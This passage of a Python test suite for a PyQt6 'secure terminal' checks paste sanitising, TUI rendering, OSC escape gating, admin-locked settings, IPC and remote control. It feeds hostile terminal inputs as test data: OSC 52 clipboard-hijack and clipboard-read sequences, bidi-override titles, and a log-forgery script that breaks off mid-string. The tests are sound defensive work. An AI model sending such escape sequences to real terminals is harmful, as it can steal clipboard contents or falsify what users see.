eq(psent, [b'payl\r'], 'stripped paste sends ASCII only (homoglyph + bidi dropped)')
psent.clear()
st_dialog.PasteWarningDialog.confirm = staticmethod(lambda *a, **k: 'unicode')
p.insertFromMimeData(mime2)
eq(psent, [('pay' + chr(0x0430) + 'l\r').encode('utf-8')],
   'unicode paste keeps the printable homoglyph but still drops the bidi override')

# --- TUI mode (pyte is a required dependency: fail closed, do not skip) -------
ok(tui_available(), 'python3-pyte available for TUI mode')
if tui_available():
    tui = SecureTerminal(command='/bin/cat', tui=True)
    tui.resize(700, 300)
    tui.show()
    pump(50)
    ok(tui.tui_active(), 'tui active')
    # cursor addressing: place text at row 3 col 5 (1-indexed)
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[2J\x1b[3;5HPLACED')
    tui._render_tui()
    rows = tui.toPlainText().split('\n')
    hit = [(i, r.index('PLACED')) for i, r in enumerate(rows) if 'PLACED' in r]
    eq(hit[:1], [(2, 4)], 'tui cursor addressing')
    # full-screen program layout (what vim/htop/tmux emit): a box drawn with
    # box-drawing characters, cursor-addressed content, and a bottom status line.
    # In show mode the box-drawing glyphs survive; the grid places every piece.
    fs = SecureTerminal(command='/bin/cat', tui=True)
    fs.resize(700, 300)
    fs.show()
    pump(50)
    fs.apply_mode('show')
    _last = fs._screen.lines                   # actual grid height in rows
    _tl, _tr = chr(0x250C), chr(0x2510)        # box corners (vim/tmux borders)
    _h, _v = chr(0x2500), chr(0x2502)
    fs._stream.feed(('\x1b[2J\x1b[1;1H' + _tl + _h * 6 + _tr
                     + '\x1b[2;1H' + _v + ' vim  ' + _v
                     + ('\x1b[%d;1H' % _last) + '-- INSERT --').encode('utf-8'))
    fs._render_tui()
    _fr = fs.toPlainText().split('\n')
    ok(_fr[0].startswith(_tl + _h * 6 + _tr), 'tui draws the top box border')
    ok(_v + ' vim  ' + _v in _fr[1], 'tui places boxed content on row 2')
    ok(_fr[_last - 1].startswith('-- INSERT --'),
       'tui places the status line on the last row')
    # the same frame in strip mode: box-drawing glyphs become _, ASCII stays
    fs.apply_mode('strip')
    fs._render_tui()
    _sr = fs.toPlainText().split('\n')
    ok(_tl not in _sr[0] and '_' in _sr[0], 'strip mode neutralizes box glyphs')
    ok(_sr[_last - 1].startswith('-- INSERT --'), 'strip keeps the ASCII status line')
    fs.shutdown()
    # a pyte parser error on real program output (private SGR that some pyte
    # builds mishandle -- htop/vim/tmux emit these) must be contained, never
    # crash the terminal
    crash = SecureTerminal(command='/bin/cat', tui=True)
    crash.resize(700, 300)
    crash.show()
    pump(50)
    crash._feed_stream(b'\x1b[1;2;3?m')          # private SGR: pyte may raise
    crash._feed_stream(b'ok\r\n')
    crash._render_tui()
    ok('ok' in crash.toPlainText(), 'pyte parser error contained; terminal survives')
    crash.shutdown()
    # per-cell bidi neutralized in strip mode
    tui.apply_mode('strip')
    tui._stream.feed(b'\x1b[10;1Ha\xe2\x80\xaeb')     # a U+202E b
    tui._render_tui()
    ok(chr(0x202E) not in tui.toPlainText(), 'tui bidi neutralized')
    # colour cell renders
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[12;1H\x1b[32mG\x1b[0m')
    tui._render_tui()
    ok(any(row[x].data == 'G' and row[x].fg == 'green'
           for row in [tui._screen.buffer[y] for y in range(tui._screen.lines)]
           for x in range(tui._screen.columns)), 'tui colour cell')
    # title + notification handling when allowed
    tui.apply_allow_title(True)
    titles = []
    notes = []
    tui.title_changed.connect(titles.append)
    tui.notified.connect(notes.append)
    tui._stream.feed(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    tui._handle_osc(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    ok(titles and chr(0x202E) not in titles[-1], 'tui title sanitized')
    tui._handle_osc(b'\x1b]9;done\x07')
    ok(notes and notes[-1] == 'done', 'tui notification captured')
    # off: no title emitted
    tui.apply_allow_title(False)
    before = len(titles)
    tui._stream.feed(b'\x1b]2;ignored\x07')
    tui._handle_osc(b'\x1b]2;ignored\x07')  # guard is in _on_readable
    # --- granular OSC handlers: each off by default, honored only when enabled ---
    import base64 as _b64                                   # noqa: E402
    from PyQt6.QtGui import QGuiApplication as _QGA2         # noqa: E402
    _QGA2.clipboard().setText('ORIGINAL')
    # clipboard OSC 52 OFF by default -> a program cannot write the clipboard
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'HIJACK') + b'\x07')
    ok(_QGA2.clipboard().text() == 'ORIGINAL',
       'OSC 52 clipboard write is neutralized until osc_clipboard is enabled')
    tui.apply_osc('osc_clipboard', True)
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'pasted') + b'\x07')
    ok(_QGA2.clipboard().text() == 'pasted', 'enabled: OSC 52 writes the clipboard')
    _QGA2.clipboard().setText('SECRET')
    tui._handle_osc(b'\x1b]52;c;?\x07')                     # read query
    ok(_QGA2.clipboard().text() == 'SECRET',
       'an OSC 52 read query is DECLINED (never answered -- no exfiltration)')
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'a\x1b[31mb\x00c') + b'\x07')
    ok(_QGA2.clipboard().text() == 'a[31mbc',
       'a clipboard write is stripped of escape/control bytes')
    # cwd OSC 7 gated + emits the safe path
    _cwds = []
    tui.cwd_changed.connect(_cwds.append)
    tui._handle_osc(b'\x1b]7;file://h/home/u/p\x07')        # osc_cwd off
    ok(_cwds == [], 'OSC 7 cwd is ignored until osc_cwd is enabled')
    tui.apply_osc('osc_cwd', True)
    tui._handle_osc(b'\x1b]7;file://h/home/u/p\x07')
    ok(_cwds == ['/home/u/p'], 'enabled: OSC 7 reports the unquoted path')
    # iTerm2 OSC 1337 is recognized but declined (no crash, no file transfer)
    tui.apply_osc('osc_iterm2', True)
    tui._handle_osc(b'\x1b]1337;File=n:' + _b64.b64encode(b'x') + b'\x07')
    ok(True, 'OSC 1337 iTerm2 is declined without crashing')
    tui.shutdown()
    # mode switch is renderer-only: NO shell restart, the running program and its
    # frame survive. A program writes a full-screen frame to stdout in line mode;
    # flipping to TUI must show the frame without the pid changing. (The frame
    # goes to stdout, not through the line-discipline echo, so the raw escapes
    # reach the read path.)
    if tui_available():
        # a real program that writes a full-screen frame to stdout, then idles so
        # the child stays alive for the pid check (a temp script avoids the shell
        # quoting/escaping that a -c string would suffer through shlex).
        _script = os.path.join(tempfile.mkdtemp(prefix='st-frame-'), 'frame.sh')
        with open(_script, 'w') as _f:
            _f.write('#!/bin/sh\n'
                     'printf "HIST_LINE\\n"\n'
                     'printf "\\033[?1049h\\033[2J\\033[HFRAME_XYZ\\n"\n'
                     'sleep 30\n')
        os.chmod(_script, 0o755)
        sw = SecureTerminal(command=_script)
        _adv = []
        sw.advise_signal.connect(_adv.append)   # advisories are EMITTED, not injected
        sw.resize(700, 300)
        sw.show()
        pump(300)
        _pid = sw._pid
        ok(sw._alt_screen, 'alt-screen tracked in line mode')
        ok(sw._tui_hint_shown and any('TUI' in a for a in _adv),
           'advisory emitted (not injected into the document) for a full-screen app')
        ok('[secure-terminal]' not in sw.toPlainText(),
           'the advisory is not injected into the terminal, so it cannot be copied')
        sw.apply_tui(True)
        pump(50)
        eq(sw._pid, _pid, 'mode switch does NOT restart the shell (same pid)')
        ok('FRAME_XYZ' in sw.toPlainText(), 'running frame survives the switch to TUI')
        sw.apply_tui(False)
        pump(30)
        eq(sw._pid, _pid, 'switching back does not restart either')
        ok('HIST_LINE' in sw.toPlainText(), 'line scrollback restored on the way back')
        sw.shutdown()
else:
    # already recorded as a FAIL above; do not silently pass
    sys.stderr.write('secure-terminal-tests(widget): FAIL pyte absent, TUI-mode '
                     'assertions could not run\n')

# line mode forwards the cursor/history keys to the shell's line editor: Up/Down
# recall history, Left/Right/Home/End/Delete edit -- the arrow-up regression.
ak = SecureTerminal(command='/bin/cat')
asent = spy_writes(ak)
key(ak, Qt.Key.Key_Up)
key(ak, Qt.Key.Key_Down)
key(ak, Qt.Key.Key_Left)
key(ak, Qt.Key.Key_Right)
key(ak, Qt.Key.Key_Home)
key(ak, Qt.Key.Key_End)
key(ak, Qt.Key.Key_Delete)
eq(asent, [b'\x1b[A', b'\x1b[B', b'\x1b[D', b'\x1b[C', b'\x1b[H', b'\x1b[F', b'\x1b[3~'],
   'line mode forwards arrows/Home/End/Delete to the shell')

# default tab label is the working-directory basename, not a static "shell":
# "~" for home, else the directory name. The child forks in our cwd.
cw = SecureTerminal(command='/bin/cat')
_cwd = os.getcwd()
_expect = '~' if _cwd == os.path.expanduser('~') else (os.path.basename(_cwd) or '/')
eq(cw.cwd_basename(), _expect, 'cwd_basename matches the shell working directory')

# hovering a reveal <U+XXXX> badge shows a tooltip explaining the code point.
from PyQt6.QtWidgets import QToolTip                    # noqa: E402
from PyQt6.QtGui import QHelpEvent                      # noqa: E402
tt = SecureTerminal(command='/bin/cat')
tt.resize(700, 300)
tt.show()
tt.apply_mode('reveal')
tt._append('x' + chr(0x20AC))                 # euro renders as the <U+20AC> badge
pump(20)
_i = tt.toPlainText().index('<U+20AC>') + 3
_c = tt.textCursor()
_c.setPosition(_i)
_rect = tt.cursorRect(_c)
_vp = _rect.center()
_hv = QHelpEvent(QEvent.Type.ToolTip, _vp, tt.viewport().mapToGlobal(_vp))
tt.event(_hv)
pump(20)
ok(QToolTip.isVisible() and 'EURO SIGN' in QToolTip.text(),
   'hovering a reveal badge shows the code-point tooltip')
QToolTip.hideText()

# --- window: rename, colour, settings round-trip ------------------------------
from secure_terminal.main import (                   # noqa: E402
    MainWindow, _is_font_noise, _read_version, APP_VERSION,
)
from secure_terminal import settings                 # noqa: E402

# version: baked from debian/changelog at build, read at runtime, fail open
eq(_read_version(['/no/such/version']), 'unknown', 'missing version file -> unknown')
_vf = tempfile.mktemp(prefix='st-version-')
with open(_vf, 'w', encoding='utf-8') as _vh:
    _vh.write('1.2.3-4\n')
eq(_read_version([_vf]), '1.2.3-4', 'version file is read and stripped')
os.remove(_vf)
ok(isinstance(APP_VERSION, str) and APP_VERSION, 'APP_VERSION is a non-empty string')

# font-shaping warning filter: the qt.text.font.db flood is dropped, real
# messages pass through
ok(_is_font_noise('qt.text.font.db', 'OpenType support missing for "X", script 9'),
   'font-db warning is noise')
ok(_is_font_noise('', 'OpenType support missing for "Y"'), 'OpenType line is noise')
ok(not _is_font_noise('default', 'some real warning'), 'real message is not noise')

win = MainWindow()
win.new_tab()
# an advisory from a terminal surfaces as the window's dismissible banner, OUTSIDE
# any terminal document (never injected, so it cannot be copied as program output).
from PyQt6.QtWidgets import QPushButton as _QPushButton     # noqa: E402
# isHidden(), not isVisible(): the top-level window is never show()n here, so
# isVisible() is False for any child; isHidden() reflects the widget's own flag.
ok(win._banner.isHidden(), 'the advisory banner starts hidden')
win.current().advise_signal.emit('switch to TUI mode to view this program')
ok(not win._banner.isHidden() and 'TUI' in win._banner_label.text(),
   'a terminal advisory shows the window banner (not injected into the terminal)')
ok('switch to TUI' not in win.current().toPlainText(),
   'the advisory text is not injected into the terminal document')
win._banner.findChild(_QPushButton).click()                # the close (X) button
ok(win._banner.isHidden(), 'the banner X button dismisses it')
# an advisory belongs to the tab that raised it, not the whole window: it shows
# only while that tab is current, never over an unrelated tab (codex P2 fix).
ok(win.tabs.count() >= 2, 'two tabs available for the per-tab banner check')
_tabA = win.tabs.widget(0)
_tabB = win.tabs.widget(1)
win.tabs.setCurrentWidget(_tabA)
_tabA.advise_signal.emit('tab A: switch to TUI mode')
ok(not win._banner.isHidden() and 'tab A' in win._banner_label.text(),
   'the advisory shows while its own tab (A) is current')
win.tabs.setCurrentWidget(_tabB)
ok(win._banner.isHidden(), 'the advisory does not hang over a different tab (B)')
win.tabs.setCurrentWidget(_tabA)
ok(not win._banner.isHidden() and 'tab A' in win._banner_label.text(),
   'switching back to tab A shows its own advisory again')
win._dismiss_advisory()
ok(win._banner.isHidden(), 'dismiss clears the current tab advisory')
# OSC-use notice: a program using an OSC escape (stripped in CLI mode) raises the
# banner ONCE per tab; the window de-duplicates the per-OSC signal.
ok(win._osc_notice, 'the OSC-use notice is on by default')
_octab = win.current()
win._osc_notified.discard(_octab)
_octab.osc_used.emit()
ok(not win._banner.isHidden() and 'OSC' in win._banner_label.text(),
   'an OSC escape raises the OSC-use notice banner')
win._dismiss_advisory()
_octab.osc_used.emit()               # a second OSC on the same tab does not re-show
ok(win._banner.isHidden(), 'the OSC notice fires only once per tab (de-duplicated)')
# disabled: a fresh tab's OSC shows nothing; re-enabling re-arms it (codex P2:
# the once-per-tab state must not be consumed while the notice is suppressed).
win.new_tab()
_octab2 = win.current()
win.set_osc_notice(False)
win._osc_notified.discard(_octab2)
_octab2.osc_used.emit()
ok(win._banner.isHidden(), 'the OSC notice is suppressed when the toggle is off')
ok(_octab2 not in win._osc_notified, 'a suppressed notice does not consume the per-tab state')
win.set_osc_notice(True)
_octab2.osc_used.emit()
ok(not win._banner.isHidden(), 're-enabling the toggle re-arms the OSC notice')
# turning the notice OFF while it is showing dismisses the banner immediately.
win.set_osc_notice(False)
ok(win._banner.isHidden(), 'switching the OSC notice off dismisses a showing banner')
win.set_osc_notice(True)
# and enabling "allow title / notifications" (OSC now handled) clears a stale
# OSC notice, since it is no longer "ignored".
win._osc_notified.discard(_octab2)
_octab2.osc_used.emit()
ok(not win._banner.isHidden(), 'an OSC notice is showing again')
win.set_allow_title(True)
ok(win._banner.isHidden(), 'enabling program title/notifications clears the OSC notice')
win.set_allow_title(False)
win._dismiss_advisory()
# granular OSC controls: a per-feature menu toggle for every OSC feature, applied
# to the tab, persisted, and reflected by the OSC security lamp (green/yellow/red).
ok(set(win._osc_actions) == {f[0] for f in _S.OSC_FEATURES},
   'every OSC feature has its own menu toggle')
ok(win._osc_level()[0] == '#1f8a54', 'the OSC lamp is green when all features are off')
win.set_osc('osc_hyperlink', True)                    # medium risk
ok(win._osc_level()[0] == '#e5a50a' and win.current().osc_enabled('osc_hyperlink')
   and win._osc_actions['osc_hyperlink'].isChecked(),
   'enabling a medium OSC feature dims the lamp to yellow, applies to the tab, checks the menu')
win.set_osc('osc_clipboard', True)                    # high risk
ok(win._osc_level()[0] == '#e5484d', 'enabling a high-risk OSC feature turns the lamp red')
win.set_osc('osc_hyperlink', False)
win.set_osc('osc_clipboard', False)
ok(win._osc_level()[0] == '#1f8a54', 'the lamp returns to green when the features are disabled')
# and the terminal actually EMITS osc_used (once) when a PROGRAM sends OSC to its
# stdout in line mode, and never shows the OSC text in the document. Drive it from
# a program (not typed input, which the tty would echo back in caret form).
_oscsh = os.path.join(tempfile.mkdtemp(prefix='st-osc-'), 'osc.sh')
with open(_oscsh, 'w') as _f:
    _f.write('#!/bin/sh\n'
             'printf "\\033]2;secret-title\\007visible\\n"\n'
             'printf "\\033]0;another\\007more\\n"\n'
             'sleep 2\n')
os.chmod(_oscsh, 0o755)
oscterm = SecureTerminal(command=_oscsh)
_oscfired = []
oscterm.osc_used.connect(lambda: _oscfired.append(1))
oscterm.resize(400, 200)
oscterm.show()
pump(300)
ok(len(_oscfired) >= 1, 'the terminal emits osc_used for OSC output in CLI mode')
_osctext = oscterm.toPlainText()
ok('secret-title' not in _osctext and 'another' not in _osctext,
   'the OSC title text is never shown in the document')
ok('visible' in _osctext, 'the program output around the OSC still shows')
# finding: in TUI mode an OSC is NOT flagged "ignored" -- a title/notification may
# be handled there (allow_title), so a contradictory notice must not fire.
if tui_available():
    _tuiosc = SecureTerminal(command=_oscsh, tui=True)
    _tuifired = []
    _tuiosc.osc_used.connect(lambda: _tuifired.append(1))
    _tuiosc.resize(400, 200)
    _tuiosc.show()
    pump(300)
    ok(not _tuifired, 'TUI mode does not flag an OSC as ignored (it may be handled)')
# turning on TUI mode auto-dismisses a "use TUI mode" (tui-kind) advisory, but NOT
# an unrelated OSC notice on the same tab (codex P2: only TUI hints are stale).
_tuitab = win.current()
win._on_advise(_tuitab, 'This program wants a full-screen interface. Turn on TUI.')
ok(not win._banner.isHidden(), 'the full-screen advisory is showing before the switch')
win.set_tui(True)
ok(win._banner.isHidden(), 'switching to TUI auto-dismisses the "use TUI mode" banner')
win.set_tui(False)
win._on_advise(_tuitab, 'An application used an OSC escape ...', 'osc')
ok(not win._banner.isHidden(), 'an OSC notice is showing')
win.set_tui(True)
ok(not win._banner.isHidden(), 'enabling TUI does NOT dismiss the OSC notice')
win.set_tui(False)
win._dismiss_advisory()
QInputDialog.getText = staticmethod(lambda *a, **k: ('build', True))
win.rename_tab(0)
eq(win.tabs.tabText(0), 'build', 'tab rename')
win.set_tab_color(0, QColor('#d83933'))
ok(not win.tabs.tabIcon(0).isNull(), 'tab colour set')
win.set_tab_color(0, None)
ok(win.tabs.tabIcon(0).isNull(), 'tab colour cleared')
# window tab actions: previous-tab wraps around, goto jumps by position, select
# all selects the current buffer, full screen toggles
win.new_tab()
win.new_tab()
_cnt = win.tabs.count()
win.tabs.setCurrentIndex(0)
win._on_tab_step(-1)
eq(win.tabs.currentIndex(), _cnt - 1, 'previous-tab wraps to the last tab')
win._goto_tab(0)
eq(win.tabs.currentIndex(), 0, 'goto tab 1 by position')
win.current()._append('pick me')
win.select_all()
ok(bool(win.current().textCursor().selectedText()), 'select all selects the buffer')
win.toggle_fullscreen(True)
ok(win.isFullScreen(), 'full screen on')
win.toggle_fullscreen(False)
# unicode display is three mutually-exclusive buttons (Strip/Reveal/Show),
# default strip, colour-coded by safety
win.act_strip.trigger()
ok(win.act_strip.isChecked() and win.current().current_mode() == 'strip',
   'Strip button selects strip')
win.act_show.trigger()
_checked = sum(a.isChecked() for a in (win.act_strip, win.act_reveal, win.act_show))
eq((win.current().current_mode(), _checked), ('show', 1),
   'Show button selects show, exclusively (only one checked)')
win.act_reveal.trigger()
eq(win.current().current_mode(), 'reveal', 'Reveal button selects reveal')
ok(not win.act_strip.icon().isNull() and not win.act_show.icon().isNull(),
   'mode buttons carry icons')
# security indicator: two lamps. display axis (show=red, reveal=green [safe and
# lossless], strip=yellow [safe but lossy -- the "_" is easy to miss]) and mode
# axis (TUI=yellow, line=green).
win.set_mode('strip')
eq((win._display_level()[1], win._display_level()[0]), ('Strip', '#e5a50a'),
   'strip display -> yellow (safe but lossy)')
win.set_mode('reveal')
eq((win._display_level()[1], win._display_level()[0]), ('Reveal', '#1f8a54'),
   'reveal display -> green (safe and lossless, not red)')
win.set_mode('show')
eq((win._display_level()[1], win._display_level()[0]), ('Show', '#d83933'),
   'show display -> red')
eq(win._mode_level()[1], 'CLI', 'CLI mode -> green mode lamp')
if tui_available():
    win.set_tui(True)
    eq((win._mode_level()[1], win._mode_level()[0]), ('TUI', '#e5a50a'),
       'TUI -> yellow mode lamp (independent of the display lamp)')
    win.set_tui(False)
    # enabling TUI leans this tab to 'show' for readability but must NOT persist
    # 'show' as the global default, and turning TUI off restores the prior mode.
    win.set_mode('strip')
    win.set_tui(True)
    eq(win.current().current_mode(), 'show', 'TUI leans the tab to show')
    eq(win._default_mode, 'strip', 'TUI does NOT persist show as the global default')
    win.set_tui(False)
    eq(win.current().current_mode(), 'strip', 'turning TUI off restores strip')
# a plain tab switch must not mutate persisted settings (setChecked on toggled
# actions is blocked): flip colours off on tab B, switch away and back.
_before_colors = win._default_colors
win.new_tab()
win.set_colors(not _before_colors)
_toggled = win._default_colors
win._goto_tab(0)                       # switch away (fires setChecked, blocked)
win._goto_tab(win.tabs.count() - 1)    # and back
eq(win._default_colors, _toggled, 'tab switch does not rewrite the colours default')
win.set_mode('strip')
ok(not win.sec_display.icon().isNull() and not win.sec_mode.icon().isNull(),
   'both security lamps show an icon')
# About dialog builds without error (patch exec so the modal does not block)
from PyQt6.QtWidgets import QDialog as _QDialog          # noqa: E402
_orig_exec = _QDialog.exec
_QDialog.exec = lambda _self: 0
try:
    win.show_about()
    win._show_security_details()
    ok(True, 'About + security-detail dialogs build without error')
finally:
    _QDialog.exec = _orig_exec
# global settings apply to every open tab and update the defaults
win.new_tab()
win._apply_global({'theme': 'light', 'zoom': 130, 'mode': 'reveal',
                   'colors': True, 'tui': False, 'allow_title': True,
                   'scrollback': 1000, 'paste_delay': 5, 'persist': True})
ok(all((win.tabs.widget(i).current_theme(), win.tabs.widget(i).current_mode(),
        win.tabs.widget(i).current_scrollback()) == ('light', 'reveal', 1000)
       for i in range(win.tabs.count())),
   'global settings applied to every open tab')
eq(win._default_mode, 'reveal', 'global settings updated the default mode')
# slash-command palette: applies settings, leading slash optional, invalid -> False
ok(win.run_command('/theme light') and win.current().current_theme() == 'light',
   'command /theme light')
ok(win.run_command('mode reveal') and win.current().current_mode() == 'reveal',
   'command mode reveal (no leading slash)')
ok(win.run_command('/colors on') and win.current().colors_enabled(),
   'command /colors on')
ok(win.run_command('/zoom 150') and win.current().current_zoom() == 150,
   'command /zoom 150')
ok(not win.run_command('/bogus xyz'), 'unknown command returns False')
win.set_theme('light')
win.set_zoom(140)
win.set_mode('reveal')
win.close()
cfg = settings.load()
eq(cfg.get('theme'), 'light', 'setting persisted theme')
eq(cfg.get('zoom'), '140', 'setting persisted zoom')
eq(cfg.get('unicode_mode'), 'reveal', 'setting persisted mode')

# --- admin-locked settings (hardening: a privileged drop-in wins, user ignored)
_sysd = tempfile.mkdtemp(prefix='st-sys-')
_usrd = tempfile.mkdtemp(prefix='st-usr-')
_orig_sys, _orig_usr = settings._system_dirs, settings._user_config_dir
settings._system_dirs = lambda: [_sysd]
settings._user_config_dir = lambda: _usrd
try:
    with open(os.path.join(_sysd, '30_default.conf'), 'w') as _f:
        _f.write('tui=false\ncolors=false\nunicode_mode=strip\n'
                 'lock=tui,colors,unicode_mode\n')
    with open(os.path.join(_usrd, '50_user.conf'), 'w') as _f:
        _f.write('colors=true\ntui=true\ntheme=light\nlock=colors\n')
    lc = settings.load()
    eq(lc.get('colors'), 'false', 'locked colours keep the admin value')
    eq(lc.get('tui'), 'false', 'locked tui keeps the admin value')
    eq(lc.get('theme'), 'light', 'an UNlocked key still lets the user win')
    eq(sorted(lc.locked), ['colors', 'remote_control', 'tui', 'unicode_mode'],
       'locked = admin locks + the always-privileged remote_control')
    eq(sorted(lc.violations), ['colors', 'tui'],
       'ignored user overrides of locked keys are recorded')
    # the window disables the locked controls and guards the setters
    lw = MainWindow()
    ok(not lw.act_colors.isEnabled() and not lw.act_tui.isEnabled()
       and all(not a.isEnabled() for a in lw._mode_actions.values()),
       'locked controls are greyed out in the UI')
    ok(lw._locked_violations, 'the window surfaces the locked-override violation')
    lw.set_colors(True)
    ok(not lw._default_colors, 'set_colors is a no-op when colours are locked')
    lw.set_mode('show')
    ok(lw._default_mode != 'show', 'set_mode is a no-op when the mode is locked')
    lw.close()
    # save() must never write a locked key back to the (dead) user config
    settings.save({'colors': 'true', 'theme': 'dark'}, locked=lc.locked)
    _written = open(settings.user_config_file()).read()
    ok('colors=' not in _written and 'theme=dark' in _written,
       'save drops locked keys, keeps unlocked ones')
finally:
    settings._system_dirs, settings._user_config_dir = _orig_sys, _orig_usr

# --- launch CLI parsing (--title/--tui/--mode/--class/--tab/-- command) -------
from secure_terminal.main import _parse_launch_args as _pla       # noqa: E402
eq(_pla(['--title', 'logs', '--tui', '--mode', 'reveal']).tabs,
   [{'title': 'logs', 'tui': True, 'mode': 'reveal', 'command': None}],
   'cli: single-tab options')
eq(_pla(['--', 'htop', '--no-color']).tabs[0]['command'], ['htop', '--no-color'],
   'cli: -- gives a real argv (no shell reparse)')
eq(_pla(['-e', 'ls -la']).tabs[0]['command'], 'ls -la',
   'cli: -e gives a shell-split string')
_lc = _pla(['--class', 'MyTerm', '--name', 'inst'])
eq((_lc.wm_class, _lc.wm_name), ('MyTerm', 'inst'), 'cli: WM class/name parsed')
eq([(t['title'], t['tui']) for t in
    _pla(['--tab', '--title', 'A', '--tab', '--title', 'B', '--tui']).tabs],
   [('A', None), ('B', True)], 'cli: --tab multi-tab, no empty leading tab')
eq(_pla([]).tabs, [], 'cli: bare launch specifies no tabs (normal startup)')
eq(_pla(['--title', 'a', '--tab', '--title', 'b', '--', 'sleep', '9'])
   .tabs[-1]['command'], ['sleep', '9'], 'cli: -- command attaches to last tab')
# robustness: adversarial / malformed argv must never crash uncaught (argparse
# may SystemExit on a bad option, which is correct for a CLI; nothing else raises)
for _argv in ([], ['--'], ['--', '--tab', '--title'], ['--tab'], ['--tab', '--tab'],
              ['--title'], ['--mode', 'bogus'], ['--class'], ['-e'],
              ['--', '-e', '--tab', '--'], ['\x00', '\x1b', '--tab', 'x'],
              ['--tab'] * 50):
    try:
        _r = _pla(_argv)
        ok(isinstance(_r.tabs, list), 'cli: argv %r -> a valid spec' % (_argv[:3],))
    except SystemExit:
        ok(True, 'cli: argv %r rejected cleanly (argparse exit)' % (_argv[:3],))
# a launch tab opens with its title/mode/command
_lw = MainWindow(launch=_pla(['--title', 'mytab', '--mode', 'reveal',
                              '--', 'sleep', '30']))
pump(150)
eq(_lw.tabs.tabText(0), 'mytab', 'launch: tab title applied')
eq(_lw.current().current_mode(), 'reveal', 'launch: display mode applied')
_lw.close()

# --- single-instance IPC: a running instance opens a client's tabs ------------
import threading                                       # noqa: E402
from secure_terminal.main import _launch_to_request    # noqa: E402
from secure_terminal import ipc as _ipc                # noqa: E402
os.environ['XDG_RUNTIME_DIR'] = tempfile.mkdtemp()     # isolated socket dir
srvwin = MainWindow(launch=_pla([]))
srvwin.start_instance_server('default')
pump(150)
ok(os.path.exists(_ipc.socket_path('default')), 'ipc: server bound its socket')
eq(oct(os.stat(_ipc.socket_path('default')).st_mode & 0o777), '0o700',
   'ipc: socket is owner-only (0700)')
_before = srvwin.tabs.count()
_res = {}


def _client():
    spec = _pla(['--title', 'fromclient', '--', 'sleep', '30'])
    _res['reply'] = _ipc.send_request('default', _launch_to_request(spec))


_th = threading.Thread(target=_client)
_th.start()
for _ in range(300):                                   # pump so the server answers
    pump(10)
    if not _th.is_alive():
        break
_th.join()
eq(_res.get('reply', {}).get('ok'), True, 'ipc: client open request accepted')
eq(srvwin.tabs.count(), _before + 1, 'ipc: the running instance opened the tab')
ok(any(srvwin.tabs.tabText(i) == 'fromclient' for i in range(srvwin.tabs.count())),
   'ipc: opened tab carries the client title')
# a malformed op is refused, not crashed
eq(srvwin._dispatch_request(b'{"op":"bogus"}').get('ok'), False,
   'ipc: unknown op refused')
eq(srvwin._dispatch_request(b'not json').get('ok'), False, 'ipc: bad json refused')
# remote control is OFF here (no admin conf) -> ctl ops refused
eq(srvwin._dispatch_request(b'{"op":"ctl-ls"}').get('ok'), False,
   'ctl: refused when remote_control is off')
srvwin.close()

# --- remote control (ctl), enabled by a privileged config ---------------------
_rcsys = tempfile.mkdtemp(prefix='st-rcsys-')
with open(os.path.join(_rcsys, '90_rc.conf'), 'w') as _f:
    _f.write('remote_control=true\n')
_o_sys2 = settings._system_dirs
settings._system_dirs = lambda: [_rcsys]
try:
    rcwin = MainWindow(launch=_pla(['--title', 'main']))
    pump(120)
    ok(rcwin._remote_control, 'ctl: privileged remote_control=true enables it')
    _lsr = rcwin._dispatch_request(b'{"op":"ctl-ls"}')
    ok(_lsr.get('ok') and _lsr['tabs'][0]['title'] == 'main', 'ctl: ls lists tabs')
    _t = spy_writes(rcwin.current())
    _sr = rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"title:main","text":"ok\\n"}')
    ok(_sr.get('ok') and _t == [b'ok\r'],
       'ctl: send-text injects sanitized text (newline -> CR)')
    # a control character in send-text is dropped by the sanitizer
    _t2 = spy_writes(rcwin.current())
    rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"id:0","text":"a\\u001bb"}')
    ok(_t2 == [b'ab'], 'ctl: send-text strips an escape (no injection)')
    rcwin._dispatch_request(
        b'{"op":"ctl-set-tab-title","tab":"id:0","title":"renamed"}')
    eq(rcwin.tabs.tabText(0), 'renamed', 'ctl: set-tab-title renames the tab')
    eq(rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"title:nope","text":"x"}').get('ok'), False,
        'ctl: an unmatched tab is an error')
    # dump-tab: read back a tab's current rendered text (for E2E assertions)
    rcwin.current()._append('alpha\nbeta\ngamma')
    pump(20)
    _dr = rcwin._dispatch_request(b'{"op":"ctl-dump-tab","tab":"id:0"}')
    ok(_dr.get('ok') and _dr['text'].endswith('gamma'), 'ctl: dump-tab reads the tab text')
    _dr2 = rcwin._dispatch_request(
        b'{"op":"ctl-dump-tab","tab":"id:0","lines":1}')
    eq(_dr2.get('text'), 'gamma', 'ctl: dump-tab --lines returns the tail')
    rcwin.close()
finally:
    settings._system_dirs = _o_sys2

# dump-tab is gated like the other ctl ops
_o_sys3 = settings._system_dirs
settings._system_dirs = lambda: [tempfile.mkdtemp()]      # no remote_control
try:
    offwin = MainWindow(launch=_pla([]))
    pump(60)
    eq(offwin._dispatch_request(b'{"op":"ctl-dump-tab","tab":"id:0"}').get('ok'),
       False, 'ctl: dump-tab refused when remote control is off')
    offwin.close()
finally:
    settings._system_dirs = _o_sys3

# --- cat-over-ssh: sanitization is at the render layer, so the byte SOURCE is
# irrelevant. A malicious file cat'd on a REMOTE host over ssh reaches the local
# terminal as the same pty byte stream a local program would emit, and is
# sanitized the same. We prove it end to end by having a subprocess emit exactly
# what a remote `cat evil-file` would deliver (the git-diffs-lie / Trojan-Source
# bytes) and asserting the rendered document is safe.
import tempfile as _tf2                                  # noqa: E402
_evil = os.path.join(_tf2.mkdtemp(prefix='st-ssh-'), 'cat_evil.sh')
with open(_evil, 'w') as _f:
    # printf writes raw bytes to stdout, exactly as `cat` of a crafted file over
    # ssh would. The cursor-up + erase-line tries to reach the EARLIER line and
    # overwrite it -- the classic log-forgery. \033 is ESC.
    _f.write('#!/bin/sh\n'
             "printf 'SECRET_REAL_OUTPUT\\n'\n"
